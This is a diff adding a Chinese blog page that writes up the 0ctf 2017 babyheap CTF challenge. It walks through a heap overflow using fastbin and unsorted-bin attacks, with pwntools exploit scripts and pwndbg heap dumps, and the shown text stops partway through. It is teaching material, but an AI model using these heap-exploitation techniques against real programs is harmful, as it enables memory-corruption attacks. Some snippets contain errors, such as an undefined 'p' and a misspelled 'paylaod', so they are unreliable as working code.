@@ -1,0 +1,349 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="程序分析123451. Allocate 申请2. Fill 填充，漏洞点，可以自定义大小填充3. Free 释放4. Dump 输出5. Exit 推出 利用方法Fastbin Attack&#x2F;Unsorted Bin Attack 利用逻辑 泄露libcunsorted bin atack 泄露main_arena地址原理 修改__mlloc_hookfastbin attack 修改">
+<meta property="og:type" content="article">
+<meta property="og:title" content="BUUCTF-PWN-0ctf_2017_babyheap">
+<meta property="og:url" content="http://example.com/2022/04/24/BUUCTF-PWN-0ctf-2017-babyheap/index.html">
+<meta property="og:site_name" content="Imp1ture">
+<meta property="og:description" content="程序分析123451. Allocate 申请2. Fill 填充，漏洞点，可以自定义大小填充3. Free 释放4. Dump 输出5. Exit 推出 利用方法Fastbin Attack&#x2F;Unsorted Bin Attack 利用逻辑 泄露libcunsorted bin atack 泄露main_arena地址原理 修改__mlloc_hookfastbin attack 修改">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2022-04-24T08:15:53.000Z">
+<meta property="article:modified_time" content="2022-04-24T11:57:33.002Z">
+<meta property="article:author" content="Imp1ture">
+<meta property="article:tag" content="pwn">
+<meta name="twitter:card" content="summary">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>BUUCTF-PWN-0ctf_2017_babyheap</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 6.0.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">首页</a></li><!--
+     --><!--
+       --><li><a href="/about/">关于</a></li><!--
+     --><!--
+       --><li><a href="/archives/">文章</a></li><!--
+     --><!--
+       --><li><a href="/tags/">分类</a></li><!--
+     --><!--
+       --><li><a href="/search/">搜索</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="上一篇" href="/2022/04/24/BUUCTF-WEB-SUCTF-2019-Pythonginx-idna%E4%B8%8Eutf-8%E7%BC%96%E7%A0%81%E6%BC%8F%E6%B4%9E/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="下一篇" href="/2022/04/23/BUUCTF-WEB-MRCTF2020-Ezpop-php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96pop%E9%93%BE/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="返回顶部" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="分享文章" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2022/04/24/BUUCTF-PWN-0ctf-2017-babyheap/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2022/04/24/BUUCTF-PWN-0ctf-2017-babyheap/&text=BUUCTF-PWN-0ctf_2017_babyheap"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2022/04/24/BUUCTF-PWN-0ctf-2017-babyheap/&title=BUUCTF-PWN-0ctf_2017_babyheap"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2022/04/24/BUUCTF-PWN-0ctf-2017-babyheap/&is_video=false&description=BUUCTF-PWN-0ctf_2017_babyheap"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=BUUCTF-PWN-0ctf_2017_babyheap&body=Check out this article: http://example.com/2022/04/24/BUUCTF-PWN-0ctf-2017-babyheap/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2022/04/24/BUUCTF-PWN-0ctf-2017-babyheap/&title=BUUCTF-PWN-0ctf_2017_babyheap"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2022/04/24/BUUCTF-PWN-0ctf-2017-babyheap/&title=BUUCTF-PWN-0ctf_2017_babyheap"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2022/04/24/BUUCTF-PWN-0ctf-2017-babyheap/&title=BUUCTF-PWN-0ctf_2017_babyheap"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2022/04/24/BUUCTF-PWN-0ctf-2017-babyheap/&title=BUUCTF-PWN-0ctf_2017_babyheap"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2022/04/24/BUUCTF-PWN-0ctf-2017-babyheap/&name=BUUCTF-PWN-0ctf_2017_babyheap&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2022/04/24/BUUCTF-PWN-0ctf-2017-babyheap/&t=BUUCTF-PWN-0ctf_2017_babyheap"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90"><span class="toc-number">1.</span> <span class="toc-text">程序分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95"><span class="toc-number">2.</span> <span class="toc-text">利用方法</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E9%80%BB%E8%BE%91"><span class="toc-number">3.</span> <span class="toc-text">利用逻辑</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%B5%81%E7%A8%8B"><span class="toc-number">4.</span> <span class="toc-text">利用流程</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%BA%E6%9C%AC%E5%87%86%E5%A4%87"><span class="toc-number">4.1.</span> <span class="toc-text">基本准备</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B3%84%E9%9C%B2libc"><span class="toc-number">4.2.</span> <span class="toc-text">泄露libc</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83"><span class="toc-number">5.</span> <span class="toc-text">参考</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        BUUCTF-PWN-0ctf_2017_babyheap
+    </h1>
+
+
+
+	
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">Imp1ture</span>
+      </span>
+	  <!--Leancloud 阅读量-->
+	  
+	<span id="/2022/04/24/BUUCTF-PWN-0ctf-2017-babyheap/" class="leancloud-visitors" data-flag-title="BUUCTF-PWN-0ctf_2017_babyheap">
+		<em class="post-meta-item-text">阅读量</em>
+		<i class="leancloud-visitors-count">loading</i>
+	</span>
+
+
+
+	  
+	  <!--Leancloud 阅读量-->
+	  
+      
+    <div class="postdate">
+      
+        <time datetime="2022-04-24T08:15:53.000Z" itemprop="datePublished">2022-04-24</time>
+        
+      
+    </div>
+
+
+      
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link-link" href="/tags/pwn/" rel="tag">pwn</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h2 id="程序分析"><a href="#程序分析" class="headerlink" title="程序分析"></a>程序分析</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1. Allocate 申请</span><br><span class="line">2. Fill 填充，漏洞点，可以自定义大小填充</span><br><span class="line">3. Free 释放</span><br><span class="line">4. Dump 输出</span><br><span class="line">5. Exit 推出</span><br></pre></td></tr></table></figure>
+<h2 id="利用方法"><a href="#利用方法" class="headerlink" title="利用方法"></a>利用方法</h2><p>Fastbin Attack&#x2F;Unsorted Bin Attack</p>
+<h2 id="利用逻辑"><a href="#利用逻辑" class="headerlink" title="利用逻辑"></a>利用逻辑</h2><ol>
+<li>泄露libc<br>unsorted bin atack 泄露main_arena地址<br><a target="_blank" rel="noopener" href="https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/unsorted-bin-attack/#unsorted-bin-attack">原理</a></li>
+<li>修改__mlloc_hook<br>fastbin attack 修改__mlloc_hook<br><a target="_blank" rel="noopener" href="https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/fastbin-attack/">原理</a><h2 id="利用流程"><a href="#利用流程" class="headerlink" title="利用流程"></a>利用流程</h2>以编写exp为底<br><a target="_blank" rel="noopener" href="https://www.smlight.top/2020/09/24/change-libc-before-excuting/">关于libc的问题</a><h3 id="基本准备"><a href="#基本准备" class="headerlink" title="基本准备"></a>基本准备</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io=process(<span class="string">&#x27;./babyheap&#x27;</span>)<span class="comment">#名字太长，我给重命名了。</span></span><br><span class="line">elf=ELF(<span class="string">&#x27;./libc6_2.23.so&#x27;</span>)<span class="comment">#题目提示ubuntu 16，所以一般用的是64位 2.23</span></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">alloc</span>(<span class="params">size</span>):</span><br><span class="line">        io.sendlineafter(<span class="string">&quot;Command: &quot;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">        io.sendlineafter(<span class="string">&quot;Size: &quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fill</span>(<span class="params">idx,size,content</span>):</span><br><span class="line">        io.sendlineafter(<span class="string">&quot;Command: &quot;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">        p.sendlineafter(<span class="string">&quot;Index: &quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">        p.sendlineafter(<span class="string">&quot;Size: &quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">        p.sendlineafter(<span class="string">&quot;Content: &quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">idx</span>):</span><br><span class="line">        io.sendlineafter(<span class="string">&quot;Command: &quot;</span>,<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">        p.sendlineafter(<span class="string">&quot;Index: &quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dump</span>(<span class="params">idx</span>):</span><br><span class="line">        io.sendlineafter(<span class="string">&quot;Command: &quot;</span>,<span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line">        p.sendlineafter(<span class="string">&quot;Index: &quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.interactive()<span class="comment">#交互</span></span><br></pre></td></tr></table></figure>
+<h3 id="泄露libc"><a href="#泄露libc" class="headerlink" title="泄露libc"></a>泄露libc</h3></li>
+<li>准备基本的堆结构<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io=process(<span class="string">&quot;./babyheap&quot;</span>) <span class="comment">#名字太长，我给重命名了。</span></span><br><span class="line">elf=ELF(<span class="string">&#x27;../libc6_2.23.so&#x27;</span>)<span class="comment">#题目提示ubuntu 16，所以一般用的是64位 2.23</span></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">alloc</span>(<span class="params">size</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Command: &quot;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Size: &quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fill</span>(<span class="params">idx,size,content</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Command: &quot;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Index: &quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Size: &quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Content: &quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">idx</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Command: &quot;</span>,<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Index: &quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dump</span>(<span class="params">idx</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Command: &quot;</span>,<span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Index: &quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">gdb.attach(io)</span><br><span class="line"></span><br><span class="line">alloc(<span class="number">0x10</span>);<span class="comment">#idx0</span></span><br><span class="line">alloc(<span class="number">0x10</span>);<span class="comment">#idx1</span></span><br><span class="line">alloc(<span class="number">0x10</span>);<span class="comment">#idx2</span></span><br><span class="line">alloc(<span class="number">0x10</span>);<span class="comment">#idx3</span></span><br><span class="line">alloc(<span class="number">0x80</span>);<span class="comment">#idx4</span></span><br><span class="line"></span><br><span class="line">io.interactive()<span class="comment">#交互</span></span><br></pre></td></tr></table></figure>
+堆情况</li>
+</ol>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">idx0--&gt; <span class="number">0x55566f861000</span>:	<span class="number">0x00000000</span>	<span class="number">0x00000000</span>	<span class="number">0x00000021</span>	<span class="number">0x00000000</span> </span><br><span class="line">        <span class="number">0x55566f861010</span>:	<span class="number">0x00000000</span>	<span class="number">0x00000000</span>	<span class="number">0x00000000</span>	<span class="number">0x00000000</span></span><br><span class="line">idx1--&gt; <span class="number">0x55566f861020</span>:	<span class="number">0x00000000</span>	<span class="number">0x00000000</span>	<span class="number">0x00000021</span>	<span class="number">0x00000000</span> </span><br><span class="line">        <span class="number">0x55566f861030</span>:	<span class="number">0x00000000</span>	<span class="number">0x00000000</span>	<span class="number">0x00000000</span>	<span class="number">0x00000000</span></span><br><span class="line">idx2--&gt; <span class="number">0x55566f861040</span>:	<span class="number">0x00000000</span>	<span class="number">0x00000000</span>	<span class="number">0x00000021</span>	<span class="number">0x00000000</span></span><br><span class="line">        <span class="number">0x55566f861050</span>:	<span class="number">0x00000000</span>	<span class="number">0x00000000</span>	<span class="number">0x00000000</span>	<span class="number">0x00000000</span></span><br><span class="line">idx3--&gt; <span class="number">0x55566f861060</span>:	<span class="number">0x00000000</span>	<span class="number">0x00000000</span>	<span class="number">0x00000021</span>	<span class="number">0x00000000</span></span><br><span class="line">        <span class="number">0x55566f861070</span>:	<span class="number">0x00000000</span>	<span class="number">0x00000000</span>	<span class="number">0x00000000</span>	<span class="number">0x00000000</span></span><br><span class="line">idx4--&gt; <span class="number">0x55566f861080</span>:	<span class="number">0x00000000</span>	<span class="number">0x00000000</span>	<span class="number">0x00000091</span>	<span class="number">0x00000000</span></span><br><span class="line">        <span class="number">0x55566f861090</span>:	<span class="number">0x00000000</span>	<span class="number">0x00000000</span>	<span class="number">0x00000000</span>	<span class="number">0x00000000</span></span><br><span class="line">        <span class="number">0x55566f8610a0</span>:	<span class="number">0x00000000</span>	<span class="number">0x00000000</span>	<span class="number">0x00000000</span>	<span class="number">0x00000000</span></span><br><span class="line">        <span class="number">0x55566f8610b0</span>:	<span class="number">0x00000000</span>	<span class="number">0x00000000</span>	<span class="number">0x00000000</span>	<span class="number">0x00000000</span></span><br><span class="line">        …………</span><br></pre></td></tr></table></figure>
+<ol start="2">
+<li>准备修改idx4,释放idx，使其进入unsorted bin</li>
+</ol>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">+续</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">2</span>)<span class="comment">#此时c2的fd指向c1</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#更改free之后c2的fd，使其指c4</span></span><br><span class="line">payload=p64(<span class="number">0x00</span>)*<span class="number">3</span></span><br><span class="line">payload+=p64(<span class="number">0x21</span>)</span><br><span class="line">payload+=p64(<span class="number">0x00</span>)*<span class="number">3</span></span><br><span class="line">payload+=p64(<span class="number">0x21</span>)</span><br><span class="line">payload+=p8(<span class="number">0x80</span>)<span class="comment">#就是更改原fd的最后一位</span></span><br><span class="line"></span><br><span class="line">fill(<span class="number">0</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line">+</span><br></pre></td></tr></table></figure>
+<p>效果如下</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; <span class="built_in">bin</span></span><br><span class="line">fastbins</span><br><span class="line"><span class="number">0x20</span>: <span class="number">0x556588195040</span> —▸ <span class="number">0x556588195020</span> ◂— <span class="number">0x0</span></span><br><span class="line">变成</span><br><span class="line"><span class="number">0x20</span>: <span class="number">0x556588195040</span> —▸ <span class="number">0x556588195080</span> ◂— <span class="number">0x0</span></span><br></pre></td></tr></table></figure>
+<p>更改c4大小，使其可以从fast bin上被取下来（不然大小会被check）</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">+续</span><br><span class="line"></span><br><span class="line">paylaod=p64(<span class="number">0x00</span>)*<span class="number">3</span></span><br><span class="line">payload+=p64(<span class="number">0x21</span>)</span><br><span class="line"><span class="comment">#通过c4 来更改c4的size</span></span><br><span class="line">fill(<span class="number">3</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line">+续</span><br></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">        pwndbg&gt; x/64wx <span class="number">0x55a4bb9c4000</span></span><br><span class="line">c0--&gt;   <span class="number">0x55a4bb9c4000</span>:	<span class="number">0x00000000</span>	<span class="number">0x00000000</span>	<span class="number">0x00000021</span>	<span class="number">0x00000000</span></span><br><span class="line">        <span class="number">0x55a4bb9c4010</span>:	<span class="number">0x00000000</span>	<span class="number">0x00000000</span>	<span class="number">0x00000000</span>	<span class="number">0x00000000</span></span><br><span class="line">c1--&gt;   <span class="number">0x55a4bb9c4020</span>:	<span class="number">0x00000000</span>	<span class="number">0x00000000</span>	<span class="number">0x00000021</span>	<span class="number">0x00000000</span></span><br><span class="line">        <span class="number">0x55a4bb9c4030</span>:	<span class="number">0x00000000</span>	<span class="number">0x00000000</span>	<span class="number">0x00000000</span>	<span class="number">0x00000000</span></span><br><span class="line">c2--&gt;   <span class="number">0x55a4bb9c4040</span>:	<span class="number">0x00000000</span>	<span class="number">0x00000000</span>	<span class="number">0x00000021</span>	<span class="number">0x00000000</span></span><br><span class="line">        <span class="number">0x55a4bb9c4050</span>:	<span class="number">0xbb9c4080</span>	<span class="number">0x000055a4</span>	<span class="number">0x00000000</span>	<span class="number">0x00000000</span></span><br><span class="line">c3--&gt;   <span class="number">0x55a4bb9c4060</span>:	<span class="number">0x00000000</span>	<span class="number">0x00000000</span>	<span class="number">0x00000021</span>	<span class="number">0x00000000</span></span><br><span class="line">        <span class="number">0x55a4bb9c4070</span>:	<span class="number">0x00000000</span>	<span class="number">0x00000000</span>	<span class="number">0x00000000</span>	<span class="number">0x00000000</span></span><br><span class="line">c4--&gt;   <span class="number">0x55a4bb9c4080</span>:	<span class="number">0x00000000</span>	<span class="number">0x00000000</span>	<span class="number">0x00000021</span>	<span class="number">0x00000000</span></span><br><span class="line">        <span class="number">0x55a4bb9c4090</span>:	<span class="number">0x00000000</span>	<span class="number">0x00000000</span>	<span class="number">0x00000000</span>	<span class="number">0x00000000</span></span><br><span class="line">        <span class="number">0x55a4bb9c40a0</span>:	<span class="number">0x00000000</span>	<span class="number">0x00000000</span>	<span class="number">0x00000021</span>	<span class="number">0x00000000</span></span><br><span class="line">        <span class="number">0x55a4bb9c40b0</span>:	<span class="number">0x00002180</span>	<span class="number">0x00000000</span>	<span class="number">0x00000000</span>	<span class="number">0x00000000</span></span><br><span class="line">        <span class="number">0x55a4bb9c40c0</span>:	<span class="number">0x00000000</span>	<span class="number">0x00000000</span>	<span class="number">0x00000000</span>	<span class="number">0x00000000</span></span><br><span class="line">        <span class="number">0x55a4bb9c40d0</span>:	<span class="number">0x00000000</span>	<span class="number">0x00000000</span>	<span class="number">0x00000000</span>	<span class="number">0x00000000</span></span><br><span class="line">        <span class="number">0x55a4bb9c40e0</span>:	<span class="number">0x00000000</span>	<span class="number">0x00000000</span>	<span class="number">0x00000000</span>	<span class="number">0x00000000</span></span><br><span class="line">        <span class="number">0x55a4bb9c40f0</span>:	<span class="number">0x00000000</span>	<span class="number">0x00000000</span>	<span class="number">0x00000000</span>	<span class="number">0x00000000</span></span><br></pre></td></tr></table></figure>
+<p>重新申请拿到c4空间，再还原c4，使其进入unsorted bin  </p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">+续</span><br><span class="line"><span class="comment">#重新拿取fastbin上的c1,c2，先进后出，可以看到id2现在就是 c4</span></span><br><span class="line">alloc(<span class="number">0x10</span>)<span class="comment">#id1,c2</span></span><br><span class="line">alloc(<span class="number">0x10</span>)<span class="comment">#id2,c4</span></span><br><span class="line"></span><br><span class="line">payload=p64(<span class="number">0x00</span>)*<span class="number">3</span></span><br><span class="line">payload+=p64(<span class="number">0x91</span>)<span class="comment">#如此才能放入unsorted bin</span></span><br><span class="line">fill(<span class="number">3</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line"></span><br><span class="line">alloc(<span class="number">0x60</span>)<span class="comment">#id5,c5，随便申请大小，这个chunk会，主要是避免c4 free后被top chunk吞掉。因为在没有申请c5前，c4紧邻top chunk，一旦free会被top chunk 合并</span></span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line">+续</span><br></pre></td></tr></table></figure>
+<p>此时的堆情况</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">c0--&gt;   <span class="number">0x55564f658000</span>:	<span class="number">0x00000000</span>	<span class="number">0x00000000</span>	<span class="number">0x00000021</span>	<span class="number">0x00000000</span></span><br><span class="line">        <span class="number">0x55564f658010</span>:	<span class="number">0x00000000</span>	<span class="number">0x00000000</span>	<span class="number">0x00000000</span>	<span class="number">0x00000000</span></span><br><span class="line">c1--&gt;   <span class="number">0x55564f658020</span>:	<span class="number">0x00000000</span>	<span class="number">0x00000000</span>	<span class="number">0x00000021</span>	<span class="number">0x00000000</span></span><br><span class="line">        <span class="number">0x55564f658030</span>:	<span class="number">0x00000000</span>	<span class="number">0x00000000</span>	<span class="number">0x00000000</span>	<span class="number">0x00000000</span></span><br><span class="line">c2--&gt;   <span class="number">0x55564f658040</span>:	<span class="number">0x00000000</span>	<span class="number">0x00000000</span>	<span class="number">0x00000021</span>	<span class="number">0x00000000</span></span><br><span class="line">        <span class="number">0x55564f658050</span>:	<span class="number">0x00000000</span>	<span class="number">0x00000000</span>	<span class="number">0x00000000</span>	<span class="number">0x00000000</span></span><br><span class="line">c3--&gt;   <span class="number">0x55564f658060</span>:	<span class="number">0x00000000</span>	<span 